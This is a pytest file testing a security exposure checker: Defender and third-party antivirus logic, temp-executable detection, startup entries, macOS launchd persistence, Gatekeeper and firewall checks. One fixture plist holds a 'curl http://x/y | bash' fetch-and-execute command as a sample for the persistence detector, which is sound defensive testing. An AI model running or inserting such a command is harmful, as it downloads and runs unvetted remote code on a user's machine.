"""
Tests for the features added in the v1.0 hardening pass:

  - frozen-app-safe self-invocation
  - winget upgrade-count parsing
  - Mach-O binary detection in the temp-executable AV check
  - Windows Defender third-party-AV awareness (false-positive fix)
  - active-vs-historical threat reporting
  - cross-platform browser / dev cache discovery
  - Startup-programs optimizer (Linux autostart)
  - Gamer helper functions for local power/GPU/protection checks
  - macOS launchd persistence + Gatekeeper checks
  - macOS firewall globalstate (root-free) detection

Run with:  pytest -v
"""
import json
import os
import sys
import types
import unittest.mock as mock

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import exposure_checker as ec


# ── Minimal reporter double ─────────────────────────────────────────────────────

class FakeReporter:
    def __init__(self):
        self.findings = []
        self.errors   = []
        self.oks      = []
        self.infos    = []
        self._data    = {"checks": []}

    def begin(self, *a, **kw):  pass
    def end(self, *a, **kw):    pass

    def finding(self, severity, label, why, fix, **extra):
        self.findings.append({"severity": severity, "label": label,
                              "why": why, "fix": fix, **extra})

    def ok(self, msg):    self.oks.append(msg)
    def info(self, msg):  self.infos.append(msg)
    def error(self, msg): self.errors.append(msg)

    def severities(self):
        return [f["severity"] for f in self.findings]


# ── _self_invocation ────────────────────────────────────────────────────────────

class TestSelfInvocation:
    def test_source_mode_includes_script(self, monkeypatch):
        monkeypatch.setattr(sys, "frozen", False, raising=False)
        inv = ec._self_invocation()
        assert inv[0] == sys.executable
        assert inv[-1].endswith("exposure_checker.py")
        assert len(inv) == 2

    def test_frozen_mode_is_executable_only(self, monkeypatch):
        # In a PyInstaller bundle __file__ points into a temp dir that vanishes;
        # the schedule must re-launch via sys.executable alone.
        monkeypatch.setattr(sys, "frozen", True, raising=False)
        inv = ec._self_invocation()
        assert inv == [sys.executable]


# ── winget upgrade-count parsing ────────────────────────────────────────────────

class TestWingetParse:
    def test_summary_line_preferred(self):
        out = (
            "Name        Id        Version  Available  Source\n"
            "------------------------------------------------\n"
            "Git.Git     Git.Git   2.40.0   2.42.0     winget\n"
            "Firefox     Moz.FF    120.0    121.0      winget\n"
            "2 upgrades available.\n"
        )
        assert ec._parse_winget_upgrade_count(out) == 2

    def test_counts_rows_without_summary(self):
        out = (
            "Name   Id    Version  Available  Source\n"
            "----------------------------------------\n"
            "Foo    Foo   1.0      2.0        winget\n"
        )
        assert ec._parse_winget_upgrade_count(out) == 1

    def test_empty_output(self):
        assert ec._parse_winget_upgrade_count("No installed package found.") == 0

    def test_no_separator_returns_zero(self):
        assert ec._parse_winget_upgrade_count("garbage\nlines\n") == 0


# ── Mach-O detection in temp-executable AV check ────────────────────────────────

class TestMachODetection:
    _MAGICS = [
        b"\xfe\xed\xfa\xce", b"\xce\xfa\xed\xfe",   # 32-bit
        b"\xfe\xed\xfa\xcf", b"\xcf\xfa\xed\xfe",   # 64-bit
        b"\xca\xfe\xba\xbe",                          # universal/fat
    ]

    @pytest.mark.parametrize("magic", _MAGICS)
    def test_macho_magic_recognised(self, magic):
        assert magic in ec._MACHO_MAGICS

    @pytest.mark.skipif(os.name == "nt", reason="needs chmod +x semantics")
    def test_macho_binary_in_temp_flagged(self, tmp_path):
        evil = tmp_path / "payload"
        evil.write_bytes(b"\xcf\xfa\xed\xfe" + b"\x00" * 64)  # Mach-O 64
        evil.chmod(0o755)
        r = FakeReporter()
        ec._av_check_temp_executables(r, temp_dirs=[str(tmp_path)])
        assert any("Mach-O" in f["label"] for f in r.findings)

    @pytest.mark.skipif(os.name == "nt", reason="needs chmod +x semantics")
    def test_plain_text_not_flagged(self, tmp_path):
        ok = tmp_path / "notes.txt"
        ok.write_bytes(b"just some notes\n")
        ok.chmod(0o755)
        r = FakeReporter()
        ec._av_check_temp_executables(r, temp_dirs=[str(tmp_path)])
        assert not r.findings


# ── Windows Defender third-party-AV awareness ───────────────────────────────────

def _fake_ps_factory(responses):
    """Return a fake _ps that matches on a substring of the command."""
    def _fake_ps(cmd, timeout=30):
        for needle, payload in responses.items():
            if needle in cmd:
                return payload, 0
        return "", 1
    return _fake_ps


class TestDefenderFalsePositives:
    def test_third_party_av_suppresses_critical(self, monkeypatch):
        responses = {
            "AntiVirusProduct": json.dumps(
                {"displayName": "Norton 360", "productState": 0x11000}),
            "Get-MpComputerStatus": json.dumps(
                {"AntivirusEnabled": False,
                 "RealTimeProtectionEnabled": False,
                 "AntivirusSignatureAge": 0}),
            "Get-MpThreat": "null",
        }
        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
        monkeypatch.setattr(ec, "_check_windows_registry_persistence", lambda r: None)
        monkeypatch.setattr(ec, "_check_windows_temp_executables", lambda r: None)
        monkeypatch.setattr(ec, "_check_windows_suspicious_procs", lambda r: None)
        r = FakeReporter()
        ec._check_malware_windows(r)
        # Norton active → Defender standing down is normal, NOT critical
        assert "CRITICAL" not in r.severities()
        assert any("Norton" in m for m in r.oks)

    def test_no_av_at_all_is_critical(self, monkeypatch):
        responses = {
            "AntiVirusProduct": "null",
            "Get-MpComputerStatus": json.dumps(
                {"AntivirusEnabled": False,
                 "RealTimeProtectionEnabled": False,
                 "AntivirusSignatureAge": 0}),
            "Get-MpThreat": "null",
        }
        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
        monkeypatch.setattr(ec, "_check_windows_registry_persistence", lambda r: None)
        monkeypatch.setattr(ec, "_check_windows_temp_executables", lambda r: None)
        monkeypatch.setattr(ec, "_check_windows_suspicious_procs", lambda r: None)
        r = FakeReporter()
        ec._check_malware_windows(r)
        assert "CRITICAL" in r.severities()

    def test_only_active_threats_reported(self, monkeypatch):
        # Get-MpThreat already filters with IsActive; an empty result must
        # produce no "active threat" finding (historical detections excluded).
        responses = {
            "AntiVirusProduct": "null",
            "Get-MpComputerStatus": json.dumps(
                {"AntivirusEnabled": True,
                 "RealTimeProtectionEnabled": True,
                 "AntivirusSignatureAge": 1}),
            "Get-MpThreat": "null",   # no active threats
        }
        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
        monkeypatch.setattr(ec, "_check_windows_registry_persistence", lambda r: None)
        monkeypatch.setattr(ec, "_check_windows_temp_executables", lambda r: None)
        monkeypatch.setattr(ec, "_check_windows_suspicious_procs", lambda r: None)
        r = FakeReporter()
        ec._check_malware_windows(r)
        assert not any("Active threat" in f["label"] for f in r.findings)

    def test_third_party_av_enabled_bit(self, monkeypatch):
        # productState 0x10000 has the 0x1000 'enabled' nibble set.
        responses = {"AntiVirusProduct": json.dumps(
            {"displayName": "Bitdefender", "productState": 0x11000})}
        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
        assert ec._win_third_party_av() == ["Bitdefender"]

    def test_disabled_third_party_av_ignored(self, monkeypatch):
        # 0x01000 has the enabled nibble clear → not counted as active.
        responses = {"AntiVirusProduct": json.dumps(
            {"displayName": "Old AV", "productState": 0x00000})}
        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
        assert ec._win_third_party_av() == []


# ── Cross-platform cache discovery ──────────────────────────────────────────────

class TestCacheDiscovery:
    def test_browser_dirs_return_pairs(self):
        pairs = ec._browser_cache_dirs()
        assert pairs and all(len(p) == 2 for p in pairs)
        names = [n for n, _ in pairs]
        assert "Chrome" in names

    def test_dev_dirs_include_pip_and_npm(self):
        names = [n for n, _ in ec._dev_cache_dirs()]
        assert any("pip" in n for n in names)
        assert any("npm" in n for n in names)

    def test_common_caches_flags_large_browser_cache(self, tmp_path, monkeypatch):
        big = tmp_path / "ChromeCache"
        big.mkdir()
        (big / "blob").write_bytes(b"\x00" * (160 * 1024 * 1024))  # 160 MB
        monkeypatch.setattr(ec, "_browser_cache_dirs",
                            lambda: [("Chrome", str(big))])
        monkeypatch.setattr(ec, "_dev_cache_dirs", lambda: [])
        r = FakeReporter()
        n = ec._cleaner_common_caches(r)
        assert n == 1
        assert any("Chrome" in f["label"] for f in r.findings)

    def test_common_caches_skips_small(self, tmp_path, monkeypatch):
        small = tmp_path / "ChromeCache"
        small.mkdir()
        (small / "blob").write_bytes(b"\x00" * (1024 * 1024))  # 1 MB
        monkeypatch.setattr(ec, "_browser_cache_dirs",
                            lambda: [("Chrome", str(small))])
        monkeypatch.setattr(ec, "_dev_cache_dirs", lambda: [])
        r = FakeReporter()
        assert ec._cleaner_common_caches(r) == 0


# ── Startup-programs audit ──────────────────────────────────────────────────────

class TestStartupAudit:
    def test_linux_autostart_flagged(self, tmp_path, monkeypatch):
        cfg = tmp_path / "config"
        autostart = cfg / "autostart"
        autostart.mkdir(parents=True)
        (autostart / "dropbox.desktop").write_text(
            "[Desktop Entry]\nName=Dropbox\nExec=dropbox start\n")
        (autostart / "spotify.desktop").write_text(
            "[Desktop Entry]\nName=Spotify\nExec=spotify --autostart\n")
        monkeypatch.setenv("XDG_CONFIG_HOME", str(cfg))
        monkeypatch.setenv("XDG_CONFIG_DIRS", str(tmp_path / "system-config"))
        r = FakeReporter()
        ec._check_startup_linux(r)
        assert len(r.findings) == 2
        assert any("Dropbox" in f["label"] for f in r.findings)
        assert all(f.get("fix_cmds") for f in r.findings)

    def test_linux_no_autostart_is_ok(self, tmp_path, monkeypatch):
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "empty"))
        monkeypatch.setenv("XDG_CONFIG_DIRS", str(tmp_path / "system-config"))
        r = FakeReporter()
        ec._check_startup_linux(r)
        assert not r.findings
        assert r.oks

    def test_linux_hidden_autostart_is_ignored(self, tmp_path, monkeypatch):
        cfg = tmp_path / "config"
        autostart = cfg / "autostart"
        autostart.mkdir(parents=True)
        (autostart / "muted.desktop").write_text(
            "[Desktop Entry]\nName=Muted\nHidden=true\n")
        monkeypatch.setenv("XDG_CONFIG_HOME", str(cfg))
        monkeypatch.setenv("XDG_CONFIG_DIRS", str(tmp_path / "system-config"))
        r = FakeReporter()
        ec._check_startup_linux(r)
        assert not r.findings
        assert r.oks


class TestGamerHelpers:
    def test_json_array_wraps_single_object(self):
        assert ec._json_array('{"Name": "GPU"}') == [{"Name": "GPU"}]

    def test_mp_disabled_values(self):
        assert ec._mp_value_disabled(0)
        assert ec._mp_value_disabled("Disabled")
        assert not ec._mp_value_disabled(1)


# ── macOS launchd persistence + Gatekeeper ──────────────────────────────────────

class TestMacPersistence:
    def test_suspicious_plist_flagged(self, tmp_path, monkeypatch):
        plist = tmp_path / "com.evil.agent.plist"
        plist.write_bytes(
            b"<plist><dict><key>ProgramArguments</key><array>"
            b"<string>/bin/bash</string><string>-c</string>"
            b"<string>curl http://x/y | bash</string></array></dict></plist>")
        monkeypatch.setattr(ec, "_MAC_LAUNCHD_DIRS", [str(tmp_path)])
        r = FakeReporter()
        n = ec._check_launchd_persistence_macos(r)
        assert n == 1
        assert "persistence" in r.findings[0]["label"].lower()

    def test_benign_plist_not_flagged(self, tmp_path, monkeypatch):
        plist = tmp_path / "com.good.agent.plist"
        plist.write_bytes(
            b"<plist><dict><key>ProgramArguments</key><array>"
            b"<string>/Applications/Thing.app/Contents/MacOS/thing</string>"
            b"</array></dict></plist>")
        monkeypatch.setattr(ec, "_MAC_LAUNCHD_DIRS", [str(tmp_path)])
        r = FakeReporter()
        assert ec._check_launchd_persistence_macos(r) == 0

    def test_gatekeeper_disabled_flagged(self, monkeypatch):
        fake = types.SimpleNamespace(stdout="assessments disabled\n", stderr="",
                                     returncode=0)
        monkeypatch.setattr(ec.subprocess, "run", lambda *a, **k: fake)
        r = FakeReporter()
        n = ec._check_gatekeeper_macos(r)
        assert n == 1
        assert "Gatekeeper" in r.findings[0]["label"]

    def test_gatekeeper_enabled_silent(self, monkeypatch):
        fake = types.SimpleNamespace(stdout="assessments enabled\n", stderr="",
                                     returncode=0)
        monkeypatch.setattr(ec.subprocess, "run", lambda *a, **k: fake)
        r = FakeReporter()
        assert ec._check_gatekeeper_macos(r) == 0


# ── macOS firewall globalstate (root-free) ──────────────────────────────────────

class TestMacFirewall:
    def test_globalstate_on_reported_ok(self, monkeypatch):
        def fake_run(cmd, *a, **k):
            if cmd[0] == "defaults":
                return types.SimpleNamespace(stdout="1\n", stderr="", returncode=0)
            return types.SimpleNamespace(stdout="", stderr="", returncode=1)
        monkeypatch.setattr(ec.subprocess, "run", fake_run)
        monkeypatch.setattr(ec.shutil, "which", lambda x: None)
        r = FakeReporter()
        ec._check_firewall_macos(r)
        assert r.oks and not r.findings

    def test_globalstate_off_flags_high(self, monkeypatch):
        def fake_run(cmd, *a, **k):
            if cmd[0] == "defaults":
                return types.SimpleNamespace(stdout="0\n", stderr="", returncode=0)
            # socketfilterfw + pfctl both report disabled
            return types.SimpleNamespace(stdout="disabled\n", stderr="", returncode=0)
        monkeypatch.setattr(ec.subprocess, "run", fake_run)
        monkeypatch.setattr(ec.shutil, "which",
                            lambda x: "/usr/libexec/ApplicationFirewall/socketfilterfw"
                            if "socket" in x else None)
        r = FakeReporter()
        ec._check_firewall_macos(r)
        assert "HIGH" in r.severities()
